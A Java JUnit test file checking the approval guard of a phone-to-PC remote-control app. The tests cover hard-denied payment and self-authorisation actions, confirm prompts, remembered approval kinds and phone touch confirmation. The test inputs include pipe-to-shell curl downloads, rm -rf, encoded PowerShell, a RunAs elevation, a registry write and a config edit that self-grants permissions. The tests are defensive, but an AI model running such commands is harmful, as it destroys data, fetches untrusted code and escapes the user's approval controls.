package com.onesay.desktop;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertNull;
import static org.junit.Assert.assertTrue;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.TreeMap;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.atomic.AtomicReference;
import org.junit.Test;

/**
 * 能批就不拦（2026-11-10）：
 * 1. 硬拒只剩三条（付款最后一下 / 自授权自批准 / 不提权），确认、「以后这类不用问」都绕不过；
 * 2. 原来关不掉的拦截改成问你（系统 / 支付类程序、有风险的网址、像命令的剪贴板、工作区只读目录）；
 * 3. 「以后这类不用问」按动作类型记住，设置页能看能撤销，远程改不了；
 * 4. 已配对手机屏幕上确认卡的真人触摸也能批（一次性 token、显示满 0.7 秒），语音 / 远程 / 机器人照旧不行；
 * 5. 确认超时 60 秒；完全访问 + 从不询问照旧直接执行；审批在执行层强制（一次性 Pass）。
 */
public class ApproveNotBlockTest {

    static final LinkPolicy.Sandbox RO = LinkPolicy.Sandbox.READ_ONLY, WS = LinkPolicy.Sandbox.WORKSPACE_WRITE, FA = LinkPolicy.Sandbox.FULL_ACCESS;
    static final LinkPolicy.Approval UN = LinkPolicy.Approval.UNTRUSTED, OR = LinkPolicy.Approval.ON_REQUEST, NV = LinkPolicy.Approval.NEVER;

    static Map<String, Object> m(Object... kv) { return PcGuardTest.m(kv); }

    static List<String> allKinds() {
        // 「什么都记住了」：所有能记住的类型
        return LinkPolicy.parseKinds("pc.setting,pc.power,pc.uninstall,pc.script_run,pc.shell_exec,pc.outside_write,pc.url,pc.url.risky,"
                + "pc.clipboard,pc.clipboard.command,pc.clipboard.sensitive,pc.blocked_app.open,pc.blocked_app.uninstall,pc.blocked_app.operate,pc.system_app,"
                + "pc.workspace.protected,phone.blocked_app.open,phone.blocked_app.uninstall,phone.system_app,phone.url.risky");
    }

    // ================================================================== 1. 三条硬规则

    @Test public void threeHardRulesCannotBeApprovedOrRemembered() throws Exception {
        List<String> all = allKinds();
        assertEquals("所有类型都认识", 20, all.size());
        for (LinkPolicy.Target t : LinkPolicy.Target.values()) {
            for (LinkPolicy.Sandbox sb : LinkPolicy.Sandbox.values()) {
                for (LinkPolicy.Approval ap : LinkPolicy.Approval.values()) {
                    LinkPolicy.Mode mode = new LinkPolicy.Mode(sb, ap);
                    String at = t + " " + mode;
                    LinkPolicy.Decision pay = LinkPolicy.remembered(LinkPolicy.decide(t, mode, LinkPolicy.Cat.PAY_FINAL, null), all);
                    assertEquals(at, LinkPolicy.Verdict.DENY, pay.verdict);
                    assertEquals(at, LinkPolicy.R_PAY_USER_TAP, pay.reason);
                    assertFalse(at, pay.rememberable());
                    LinkPolicy.Decision self = LinkPolicy.remembered(LinkPolicy.decide(t, mode, LinkPolicy.Cat.SELF_AUTHORIZE, null), all);
                    assertEquals(at, LinkPolicy.R_SELF_GRANT_BLOCKED, self.reason);
                    assertEquals(at, LinkPolicy.Verdict.SCRIPT, LinkPolicy.remembered(LinkPolicy.decide(t, mode, LinkPolicy.Cat.SELF_GRANT, null), all).verdict);
                    assertEquals(at, LinkPolicy.R_VOICE_APPROVAL_BLOCKED, LinkPolicy.remembered(LinkPolicy.decide(t, mode, LinkPolicy.Cat.REMOTE_APPROVAL, null), all).reason);
                    LinkPolicy.Facts me = new LinkPolicy.Facts();
                    me.appSelf = true;
                    me.appSystem = true;
                    me.appBlocked = true;
                    assertEquals(at, LinkPolicy.R_SELF_GRANT_BLOCKED, LinkPolicy.remembered(LinkPolicy.decide(t, mode, LinkPolicy.Cat.UNINSTALL_APP, me), all).reason);
                    if (t == LinkPolicy.Target.PC) {
                        LinkPolicy.Decision adm = LinkPolicy.remembered(LinkPolicy.decide(t, mode, LinkPolicy.Cat.SYSTEM_A, null), all);
                        assertEquals(at, LinkPolicy.Verdict.SCRIPT, adm.verdict);
                        assertEquals(at, LinkPolicy.R_NEEDS_ADMIN_SCRIPT, adm.reason);
                        LinkPolicy.Facts up = new LinkPolicy.Facts();
                        up.pluginBlocked = "想用管理员身份运行";
                        up.pluginReason = LinkPolicy.R_PLUGIN_BLOCKED;
                        assertEquals(at, LinkPolicy.Verdict.DENY, LinkPolicy.remembered(LinkPolicy.decide(t, mode, LinkPolicy.Cat.SHELL_EXEC, up), all).verdict);
                    }
                }
            }
        }
        // 指令名
        for (String c : new String[]{"pay", "pay_confirm", "transfer", "checkout", "place_order", "PAY"}) {
            assertEquals(c, LinkPolicy.Cat.PAY_FINAL, LinkPolicy.pcCat(c));
            assertEquals(c, LinkPolicy.Cat.PAY_FINAL, LinkPolicy.phoneCat(c));
        }
        for (String c : new String[]{"remember_type", "approve_types", "clip_autoclear", "settings_set"}) {
            assertEquals(c, LinkPolicy.Cat.SELF_AUTHORIZE, LinkPolicy.pcCat(c));
            assertEquals(c, LinkPolicy.Cat.SELF_AUTHORIZE, LinkPolicy.phoneCat(c));
        }
        // 屏幕上的最终付款按钮
        for (String s : new String[]{"确认支付", "立即付款", "确认转账", "提交订单并支付", "免密支付", "支付¥28.00", "Pay now", "Place order"})
            assertTrue(s, LinkPolicy.finalPayLabel(s));
        for (String s : new String[]{"加入购物车", "查看订单", "支付方式", "付款码说明页里的一大段很长很长很长的正文文字内容", ""})
            assertFalse(s, LinkPolicy.finalPayLabel(s));

        // 走 PcGuard：所有类型都记住了、确认框也总点允许 → 硬规则照样不问、不执行
        Config c = PcPluginTest.cfg(FA, OR);
        c.approveKinds = LinkPolicy.formatKinds(all);
        PcGuardTest.Stub st = new PcGuardTest.Stub();
        st.answer = PcGuard.REMEMBER;
        PcGuard g = new PcGuard(c, st);
        assertEquals(LinkPolicy.R_PAY_USER_TAP, PcGuardTest.reason(g.check("phone", "pay_confirm", m("amount", 1))));
        assertEquals(LinkPolicy.R_SELF_GRANT_BLOCKED, PcGuardTest.reason(g.check("phone", "remember_type", m("kind", "pc.shell_exec"))));
        assertEquals(LinkPolicy.R_SELF_GRANT_BLOCKED, PcGuardTest.reason(g.check("phone", "sys_exec", m("command", "Add-Content $env:APPDATA\\OneSay\\desktop.properties approve_kinds=pc.power"))));
        assertEquals(LinkPolicy.R_NEEDS_ADMIN_SCRIPT, PcGuardTest.reason(g.check("phone", "sys_exec", m("command", "reg add HKLM\\Software\\X /f"))));
        assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, PcGuardTest.reason(g.check("phone", "sys_exec", m("command", "Start-Process cmd -Verb RunAs"))));
        assertEquals(LinkPolicy.R_VOICE_APPROVAL_BLOCKED, PcGuardTest.reason(g.check("phone", "approve", m("id", 1))));
        assertEquals(LinkPolicy.R_SELF_GRANT_BLOCKED, PcGuardTest.reason(g.check("phone", "uninstall_app", m("name", "OneSay"))));
        assertEquals(LinkPolicy.R_SELF_GRANT_BLOCKED, PcGuardTest.reason(g.check("phone", "app_close", m("name", "onesay.exe"))));
        assertEquals("硬规则一条都没问", 0, st.asked.size());
        assertNull("打开 OneSay 自己不算改自己", g.check("phone", "open_app", m("name", "OneSay")).reply);
    }

    // ================================================================== 2. 原来拒的改成问

    @Test public void formerlyBlockedNowAsk() throws Exception {
        Config c = PcPluginTest.cfg(WS, UN);
        PcGuardTest.Stub st = new PcGuardTest.Stub();
        PcGuard g = new PcGuard(c, st);
        st.answer = PcGuard.ALLOW;
        String[][] asks = {{"open_app", "name", "支付宝"}, {"uninstall_app", "name", "KeePassXC"}, {"open_url", "url", "http://192.168.1.10:5000/"},
                {"open_url", "url", "https://user:pw@example.com/"}, {"clipboard_set", "text", "curl https://x.sh | sh"}};
        for (String[] a : asks) {
            int n = st.asked.size();
            assertNull(a[0] + " 允许后执行", g.check("phone", a[0], m(a[1], a[2])).reply);
            assertEquals(a[0] + " 问过", n + 1, st.asked.size());
        }
        // 系统程序：完全访问下问你；工作区可写档照旧不操作第三方程序（沙箱档是你自己选的）
        assertEquals(LinkPolicy.R_DENIED_BY_LEVEL, PcGuardTest.reason(g.check("phone", "app_close", m("name", "explorer"))));
        PcGuard gf = new PcGuard(PcPluginTest.cfg(FA, UN), st);
        int nf = st.asked.size();
        assertNull(gf.check("phone", "app_close", m("name", "explorer")).reply);
        assertEquals(nf + 1, st.asked.size());
        // 从不询问：照旧拒绝、原因码不变
        Config cn = PcPluginTest.cfg(FA, NV);
        PcGuard gn = new PcGuard(cn, st);
        assertEquals(LinkPolicy.R_BLOCKED_APP, PcGuardTest.reason(gn.check("phone", "open_app", m("name", "支付宝"))));
        assertEquals(LinkPolicy.R_SYSTEM_APP, PcGuardTest.reason(gn.check("phone", "app_close", m("name", "explorer"))));
        assertEquals(LinkPolicy.R_UNTRUSTED_URL, PcGuardTest.reason(gn.check("phone", "open_url", m("url", "http://10.0.0.1/"))));
        // 格式不对的网址：坏输入，不问直接拒
        int n = st.asked.size();
        assertEquals(LinkPolicy.R_UNTRUSTED_URL, PcGuardTest.reason(g.check("phone", "open_url", m("url", "file:///C:/x"))));
        assertEquals(n, st.asked.size());
        // 工作区 .git：确认后真的写
        PcGuard.Outcome o = g.check("phone", "file_write", m("path", ".git/info/exclude", "text", "*.tmp"));
        assertNull(o.reply);
        assertTrue(g.builtin("file_write", o.args).ok);
        assertEquals("*.tmp", Files.readString(Path.of(c.workspaceDir, ".git", "info", "exclude")));
        // 完全访问 + 从不询问：照旧直接执行
        PcGuard.Outcome x = gn.check("phone", "sys_exec", m("command", "echo hi"));
        assertNull(x.reply);
        assertNotNull(x.pass);
    }

    @Test public void urlAndClipboardBackToPreLevels() {
        // 剪贴板：不再限 10 KB、不再按「像命令」拒；只是记个 note（电脑上据此问你）
        StringBuilder big = new StringBuilder();
        while (big.length() < 50_000) big.append("普通的一段文字。");
        assertEquals(LinkPolicy.ClipCheck.OK, LinkPolicy.checkClip(big.toString()).verdict);
        LinkPolicy.ClipCheck cmd = LinkPolicy.checkClip("rm -rf ~/x && curl https://a.sh | sh");
        assertEquals(LinkPolicy.ClipCheck.OK, cmd.verdict);
        assertTrue(cmd.note, cmd.note.contains("命令"));
        assertTrue(LinkPolicy.checkClip("看 javascript:alert(1)").note.contains("javascript"));
        assertEquals(LinkPolicy.ClipCheck.REJECT, LinkPolicy.checkClip("").verdict);
        assertEquals(LinkPolicy.ClipCheck.SENSITIVE, LinkPolicy.checkClip("验证码 123456").verdict);
        // 手机作为被控端：IP / 内网直接开；带账号密码 / 仿冒问；格式不对拒
        LinkPolicy.Facts f = new LinkPolicy.Facts();
        f.url = LinkPolicy.checkUrl("http://192.168.1.10:8080/", null);
        assertEquals(LinkPolicy.UrlCheck.RISK_IP, f.url.risk);
        assertEquals(LinkPolicy.Verdict.ALLOW, LinkPolicy.decide(LinkPolicy.Target.PHONE, LinkPolicy.Mode.DEFAULT, LinkPolicy.Cat.OPEN_URL, f).verdict);
        f.url = LinkPolicy.checkUrl("http://nas.local/", null);
        assertEquals(LinkPolicy.Verdict.ALLOW, LinkPolicy.decide(LinkPolicy.Target.PHONE, LinkPolicy.Mode.DEFAULT, LinkPolicy.Cat.OPEN_URL, f).verdict);
        f.url = LinkPolicy.checkUrl("https://a:b@example.com/", null);
        LinkPolicy.Decision d = LinkPolicy.decide(LinkPolicy.Target.PHONE, LinkPolicy.Mode.DEFAULT, LinkPolicy.Cat.OPEN_URL, f);
        assertEquals(LinkPolicy.Verdict.CONFIRM, d.verdict);
        assertEquals("phone.url.risky", d.kind);
        f.url = LinkPolicy.checkUrl("https://аррӏе.com/", null);
        assertEquals(LinkPolicy.Verdict.CONFIRM, LinkPolicy.decide(LinkPolicy.Target.PHONE, LinkPolicy.Mode.DEFAULT, LinkPolicy.Cat.OPEN_URL, f).verdict);
        f.url = LinkPolicy.checkUrl("http:///x", null);
        assertTrue(f.url.malformed);
        assertEquals(LinkPolicy.Verdict.DENY, LinkPolicy.decide(LinkPolicy.Target.PHONE, LinkPolicy.Mode.DEFAULT, LinkPolicy.Cat.OPEN_URL, f).verdict);
        LinkPolicy.Facts k = new LinkPolicy.Facts();
        k.clip = LinkPolicy.checkClip("powershell -enc AAAA");
        assertEquals(LinkPolicy.Verdict.ALLOW, LinkPolicy.decide(LinkPolicy.Target.PHONE, LinkPolicy.Mode.DEFAULT, LinkPolicy.Cat.CLIPBOARD_WRITE, k).verdict);
        // 60 秒清除默认关
        assertFalse(LinkPolicy.CLIP_AUTOCLEAR_DEFAULT);
        assertEquals(60_000L, LinkPolicy.CLIP_SENSITIVE_CLEAR_MS);
    }

    // ================================================================== 3. 「以后这类不用问」

    @Test public void rememberByKindViewRevokeAndPersist() throws Exception {
        Config c = PcPluginTest.cfg(WS, UN);
        KindStub st = new KindStub();
        st.answer = PcGuard.REMEMBER;
        PcGuard g = new PcGuard(c, st);
        List<String> notes = new ArrayList<>();
        g.notify = notes::add;
        PcGuard.Outcome o = g.check("phone", "sys_exec", m("command", "echo 1"));
        assertNull(o.reply);
        assertEquals(List.of("sys_exec|pc.shell_exec"), st.asked);
        assertEquals(List.of("pc.shell_exec"), g.rememberedKinds());
        assertEquals("pc.shell_exec", Config.load(c.file).approveKinds);
        // 第二次同类：不问，直接执行，带提醒
        st.answer = PcGuard.DENY;
        PcGuard.Outcome o2 = g.check("phone", "sys_exec", m("command", "echo 2"));
        assertNull(o2.reply);
        assertEquals("pc.shell_exec", o2.rememberedKind);
        assertEquals(1, st.asked.size());
        assertTrue(notes.toString(), notes.get(notes.size() - 1).contains("以后这类不用问"));
        // 别的类型照样问
        assertNotNull(g.check("phone", "shutdown", null).reply);
        assertEquals(2, st.asked.size());
        // 设置页：看、撤销；撤销后又问
        assertEquals("电脑：执行命令", ((Map<?, ?>) g.rememberedView().get(0)).get("zh"));
        assertTrue(g.forget("pc.shell_exec"));
        assertFalse(g.forget("pc.shell_exec"));
        assertNotNull(g.check("phone", "sys_exec", m("command", "echo 3")).reply);
        assertEquals(3, st.asked.size());
        // 快捷指令没有类型：按内容哈希批准，REMEMBER 只算允许一次
        assertEquals("", LinkPolicy.decide(LinkPolicy.Target.PC, LinkPolicy.Mode.DEFAULT, LinkPolicy.Cat.SHORTCUT, LinkPolicy.shortcutFacts("a.ps1", "x".getBytes(), null, true)).kind);
        // 乱写的类型不收
        assertEquals(List.of("pc.power"), LinkPolicy.parseKinds("pc.power, hack.all, PC.POWER, pc.power"));
        assertFalse(g.remember("everything"));
        // 界面接口：撤销
        g.remember("pc.power");
        assertEquals(1, g.rememberedView().size());
        // 配置项名字远程碰不了（插件把它当改 OneSay 自己）
        assertNotNull(LinkPolicy.inspectCommand("echo approve_kinds=pc.power >> x", new LinkPolicy.Rules()));
    }

    @Test public void confirmsRememberOnlyWhenOffered() throws Exception {
        AtomicLong t = new AtomicLong(0);
        PcGuard.Confirms cf = ApprovalGuardTest.fake(t);
        CompletableFuture<Integer> r = askKind(cf, "pc.power");
        int id = ApprovalGuardTest.waitId(cf);
        assertEquals("pc.power", ((Map<?, ?>) cf.list().get(0)).get("remember_kind"));
        cf.seen(id, true);
        t.addAndGet(ConfirmGate.ARM_MS);
        assertEquals(ConfirmGate.Answer.ACCEPTED, cf.answer(id, true, false, true, ConfirmGate.Input.MOUSE));
        assertEquals(PcGuard.REMEMBER, (int) r.get(2, TimeUnit.SECONDS));
        // 没给勾选的：勾了也只算允许一次
        r = askKind(cf, "");
        id = ApprovalGuardTest.waitId(cf);
        cf.seen(id, true);
        t.addAndGet(ConfirmGate.ARM_MS);
        cf.answer(id, true, false, true, ConfirmGate.Input.MOUSE);
        assertEquals(PcGuard.ALLOW, (int) r.get(2, TimeUnit.SECONDS));
        // 拒绝 + 勾选 = 拒绝
        r = askKind(cf, "pc.power");
        id = ApprovalGuardTest.waitId(cf);
        cf.answer(id, false, false, true, ConfirmGate.Input.MOUSE);
        assertEquals(PcGuard.DENY, (int) r.get(2, TimeUnit.SECONDS));
        // 语音带着勾选也不算
        r = askKind(cf, "pc.power");
        id = ApprovalGuardTest.waitId(cf);
        cf.seen(id, true);
        t.addAndGet(ConfirmGate.ARM_MS);
        assertEquals(ConfirmGate.Answer.NOT_LOCAL, cf.answer(id, true, false, true, ConfirmGate.Input.VOICE));
        t.addAndGet(LinkPolicy.CONFIRM_TIMEOUT_MS);
        assertEquals(PcGuard.TIMEOUT, (int) r.get(2, TimeUnit.SECONDS));
    }

    /** 记下每次给的「以后这类不用问」类型。 */
    static final class KindStub implements PcGuard.Confirmer {
        int answer = PcGuard.TIMEOUT;
        final List<String> asked = new ArrayList<>();

        @Override public int ask(String from, String cmd, String detail, long timeoutMs) { return ask(from, cmd, detail, timeoutMs, false, ""); }

        @Override public int ask(String from, String cmd, String detail, long timeoutMs, boolean offerAlways, String rememberKind) {
            assertEquals(PcGuard.CONFIRM_MS, timeoutMs);
            asked.add(cmd + "|" + rememberKind);
            return answer;
        }
    }

    static CompletableFuture<Integer> askKind(PcGuard.Confirms cf, String kind) {
        CompletableFuture<Integer> f = new CompletableFuture<>();
        Thread th = new Thread(() -> {
            try { f.complete(cf.ask("phone", "shutdown", "关机", PcGuard.CONFIRM_MS, false, kind)); } catch (Throwable e) { f.completeExceptionally(e); }
        });
        th.setDaemon(true);
        th.start();
        return f;
    }

    // ================================================================== 4. 手机屏幕上的确认卡

    @Test public void phoneCardGateRules() {
        String tok = "abcdefghijklmnopqrstuv";
        ConfirmGate g = new ConfirmGate(0, LinkPolicy.CONFIRM_TIMEOUT_MS);
        assertEquals("没发过手机卡", ConfirmGate.Answer.NOT_LOCAL, g.checkPhone(1000, true, "ph", tok, ConfirmGate.Input.PHONE_TOUCH, 900));
        g.phoneOffered(100, "ph", tok);
        assertTrue(g.phoneOffered());
        assertEquals("别的手机", ConfirmGate.Answer.NOT_LOCAL, g.checkPhone(2000, true, "ph2", tok, ConfirmGate.Input.PHONE_TOUCH, 900));
        assertEquals("token 不对", ConfirmGate.Answer.NOT_LOCAL, g.checkPhone(2000, true, "ph", tok + "x", ConfirmGate.Input.PHONE_TOUCH, 900));
        assertEquals("语音", ConfirmGate.Answer.NOT_LOCAL, g.checkPhone(2000, true, "ph", tok, ConfirmGate.Input.VOICE, 900));
        assertEquals("机器人 / 来源不明", ConfirmGate.Answer.NOT_LOCAL, g.checkPhone(2000, true, "ph", tok, ConfirmGate.Input.UNKNOWN, 900));
        assertEquals("手机上没显示满 0.7 秒", ConfirmGate.Answer.TOO_EARLY, g.checkPhone(2000, true, "ph", tok, ConfirmGate.Input.PHONE_TOUCH, 300));
        assertEquals("离发出不到 0.7 秒", ConfirmGate.Answer.TOO_EARLY, g.checkPhone(500, true, "ph", tok, ConfirmGate.Input.PHONE_TOUCH, 900));
        assertEquals(ConfirmGate.Answer.ACCEPTED, g.checkPhone(2000, true, "ph", tok, ConfirmGate.Input.PHONE_TOUCH, 900));
        assertEquals("电脑界面接口给不出手机触摸", ConfirmGate.Answer.NOT_LOCAL, g.check(2000, true, ConfirmGate.Input.PHONE_TOUCH));
        assertEquals(ConfirmGate.Input.UNKNOWN, ConfirmGate.Input.of("phone_touch"));
        assertEquals("拒绝（同一张卡）就收", ConfirmGate.Answer.ACCEPTED, g.checkPhone(2000, false, "ph", tok, ConfirmGate.Input.UNKNOWN, 0));
        // 手机卡在等时：电脑窗口失焦 / 没动静不按拒绝；超时照旧
        ConfirmGate b = new ConfirmGate(0, LinkPolicy.CONFIRM_TIMEOUT_MS);
        b.seen(0, true);
        b.phoneOffered(10, "ph", tok);
        b.window(100, false);
        assertNull(b.expired(30_000));
        assertNull(b.expired(59_999));
        assertEquals(ConfirmGate.END_TIMEOUT, b.expired(60_000));
        assertEquals("超时后手机点也不算", ConfirmGate.Answer.GONE, b.checkPhone(60_000, true, "ph", tok, ConfirmGate.Input.PHONE_TOUCH, 5000));
        // 手机卡没发出去：失焦规则照旧
        ConfirmGate n = new ConfirmGate(0, LinkPolicy.CONFIRM_TIMEOUT_MS);
        n.seen(0, true);
        n.window(100, false);
        assertEquals(ConfirmGate.END_BLUR, n.expired(100 + ConfirmGate.BLUR_DENY_MS));
        assertEquals("短 token 不认", false, newGateWithToken("short").phoneOffered());
    }

    static ConfirmGate newGateWithToken(String tok) {
        ConfirmGate g = new ConfirmGate(0, 1000);
        g.phoneOffered(0, "ph", tok);
        return g;
    }

    @Test public void confirmsAcceptPhoneTouchWithRemember() throws Exception {
        AtomicLong t = new AtomicLong(0);
        PcGuard.Confirms cf = ApprovalGuardTest.fake(t);
        AtomicReference<PcGuard.PhoneOffer> sent = new AtomicReference<>();
        List<Integer> closed = new ArrayList<>();
        cf.phoneOffer = o -> { sent.set(o); return true; };
        cf.phoneClose = o -> closed.add(o.id);
        CompletableFuture<Integer> r = askKind(cf, "pc.power");
        int id = ApprovalGuardTest.waitId(cf);
        for (int i = 0; i < 200 && sent.get() == null; i++) Thread.sleep(5);
        PcGuard.PhoneOffer o = sent.get();
        assertNotNull(o);
        assertEquals(id, o.id);
        assertEquals("phone", o.from);
        assertTrue(o.token.length() >= 22);
        assertEquals(Boolean.TRUE, ((Map<?, ?>) cf.list().get(0)).get("phone"));
        t.addAndGet(800);
        assertEquals(ConfirmGate.Answer.NOT_LOCAL, cf.answerPhone("phone", id, o.token, true, false, true, "voice", 900));
        assertEquals(ConfirmGate.Answer.NOT_LOCAL, cf.answerPhone("phone", id, "x" + o.token, true, false, true, "touch", 900));
        assertEquals(ConfirmGate.Answer.TOO_EARLY, cf.answerPhone("phone", id, o.token, true, false, true, "touch", 100));
        assertEquals(ConfirmGate.Answer.ACCEPTED, cf.answerPhone("phone", id, o.token, true, false, true, "touch", 900));
        assertEquals(PcGuard.REMEMBER, (int) r.get(2, TimeUnit.SECONDS));
        for (int i = 0; i < 200 && closed.isEmpty(); i++) Thread.sleep(5);
        assertEquals("结束后叫手机收卡", List.of(id), closed);
        // 手机不在线：照样只在电脑上等，60 秒没人点 = 拒绝
        cf.phoneOffer = x -> false;
        r = askKind(cf, "");
        id = ApprovalGuardTest.waitId(cf);
        assertEquals(Boolean.FALSE, ((Map<?, ?>) cf.list().get(0)).get("phone"));
        assertEquals(ConfirmGate.Answer.NOT_LOCAL, cf.answerPhone("phone", id, o.token, true, false, false, "touch", 900));
        t.addAndGet(LinkPolicy.CONFIRM_TIMEOUT_MS - 1);
        Thread.sleep(50);
        assertFalse("59.999 秒还在等", r.isDone());
        t.addAndGet(1);
        assertEquals(PcGuard.TIMEOUT, (int) r.get(2, TimeUnit.SECONDS));
    }

    /** 端到端（真局域网 + TLS）：手机发令 → 电脑要确认 → 确认卡发到手机常连 → 手机真人触摸批准 → 执行；语音 / 远程「approve」指令照旧拒。 */
    @Test public void endToEndPhoneCardApproves() throws Exception {
        try (LinkV2Test.Server s = new LinkV2Test.Server()) {
            s.cfg.workspaceDir = Files.createTempDirectory("anb-e2e").toFile().getCanonicalPath();
            Config ph = LinkV2Test.phoneCfg(s.cfg, "phone-anb");
            LinkV2Test.Conn held = new LinkV2Test.Conn(ph, true, (self, f) -> { });
            assertTrue(held.why.get(), held.up);
            // 远程「approve」指令照旧拒
            Map<String, Object> rej = held.request(ph, "approve", m("id", 1));
            assertEquals(LinkPolicy.R_VOICE_APPROVAL_BLOCKED, ((Map<?, ?>) rej.get("data")).get("reason"));

            String id = Protocol.newId();
            held.lc.send(Protocol.envelope("pc-lan", id, Protocol.command(ph.pairKey, id, ph.deviceId, "pc-lan", "sys_exec", m("command", "echo phone-ok"), System.currentTimeMillis()))).get(3, TimeUnit.SECONDS);
            Map<String, Object> offer = null;
            long end = System.currentTimeMillis() + 8000;
            while (offer == null && System.currentTimeMillis() < end) {
                Map<String, Object> f = held.frames.poll(200, TimeUnit.MILLISECONDS);
                if (f != null && f.get("body") instanceof Map && "confirm_offer".equals(((Map<?, ?>) f.get("body")).get("kind"))) {
                    @SuppressWarnings("unchecked") Map<String, Object> b = (Map<String, Object>) f.get("body");
                    assertEquals(Protocol.Check.OK, Protocol.verify(ph.pairKey, String.valueOf(f.get("id")), "pc-lan", ph.deviceId, b, System.currentTimeMillis(), null));
                    offer = b;
                }
            }
            assertNotNull("确认卡发到了手机", offer);
            assertTrue(String.valueOf(offer.get("detail")).contains("echo phone-ok"));
            assertEquals("pc.shell_exec", offer.get("remember_kind"));
            assertTrue(((Number) offer.get("timeout_ms")).longValue() > 50_000);
            // 先来一条「语音」批准：不算
            sendAnswer(held, ph, offer, true, "voice", 900);
            Thread.sleep(900);
            assertFalse(s.agent.confirms.list().isEmpty());
            // 真人触摸
            sendAnswer(held, ph, offer, true, "touch", 900);
            Map<String, Object> res = null;
            end = System.currentTimeMillis() + 15000;
            while (res == null && System.currentTimeMillis() < end) {
                Map<String, Object> f = held.frames.poll(200, TimeUnit.MILLISECONDS);
                if (f != null && f.get("body") instanceof Map && id.equals(((Map<?, ?>) f.get("body")).get("re"))) {
                    @SuppressWarnings("unchecked") Map<String, Object> b = (Map<String, Object>) f.get("body");
                    res = b;
                }
            }
            assertNotNull("结果回来了", res);
            assertEquals(String.valueOf(res.get("text")), Boolean.TRUE, res.get("ok"));
            assertTrue(String.valueOf(res.get("data")), String.valueOf(((Map<?, ?>) res.get("data")).get("output")).contains("phone-ok"));
            String log;
            synchronized (s.log) { log = s.log.toString(); }
            assertTrue(log, log.contains("确认也发到了手机"));
            assertTrue(log, log.contains("不是手机界面上的真人触摸"));
            assertTrue(log, log.contains("真人触摸"));
            held.lc.stop();
        }
    }

    static void sendAnswer(LinkV2Test.Conn c, Config ph, Map<String, Object> offer, boolean allow, String input, long shownMs) throws Exception {
        Map<String, Object> b = new TreeMap<>();
        b.put("kind", "confirm_answer");
        b.put("cid", offer.get("cid"));
        b.put("token", offer.get("token"));
        b.put("allow", allow);
        b.put("always", false);
        b.put("remember", false);
        b.put("input", input);
        b.put("shown_ms", shownMs);
        String mid = Protocol.newId();
        c.lc.send(Protocol.envelope("pc-lan", mid, Protocol.seal(ph.pairKey, mid, ph.deviceId, "pc-lan", b, System.currentTimeMillis()))).get(3, TimeUnit.SECONDS);
    }

    // ================================================================== 5. 60 秒 / 执行层

    @Test public void timeoutIs60sAndPassIsOneShot() throws Exception {
        assertEquals(60_000L, PcGuard.CONFIRM_MS);
        assertEquals(60_000L, LinkPolicy.CONFIRM_TIMEOUT_MS);
        assertTrue(LinkPolicy.reasonZh(LinkPolicy.R_CONFIRM_TIMEOUT).contains("60 秒"));
        Config c = PcPluginTest.cfg(WS, UN);
        PcGuard g = new PcGuard(c, new PcGuardTest.Stub());
        PcGuard.Outcome o = g.check("phone", "echo", m("text", "x"));
        assertNotNull(o.pass);
        assertFalse("参数换了不行", o.pass.consume("echo", new TreeMap<>(o.args)));
        assertFalse("指令换了不行", o.pass.consume("sys_exec", o.args));
        assertTrue(o.pass.consume("echo", o.args));
        assertFalse("用过一次就作废", o.pass.consume("echo", o.args));
        PcGuard.Outcome no = g.check("phone", "format_c", null);
        assertNull("拒绝的没有凭证", no.pass);
        // 完全访问 · 从不询问：命令照旧直接执行（判定 = ALLOW，不问）
        assertEquals(LinkPolicy.Verdict.ALLOW, LinkPolicy.decide(LinkPolicy.Target.PC, new LinkPolicy.Mode(FA, NV), LinkPolicy.Cat.SHELL_EXEC, null).verdict);
        assertEquals(LinkPolicy.Verdict.DENY, LinkPolicy.decide(LinkPolicy.Target.PC, new LinkPolicy.Mode(RO, NV), LinkPolicy.Cat.SHELL_EXEC, null).verdict);
    }
}
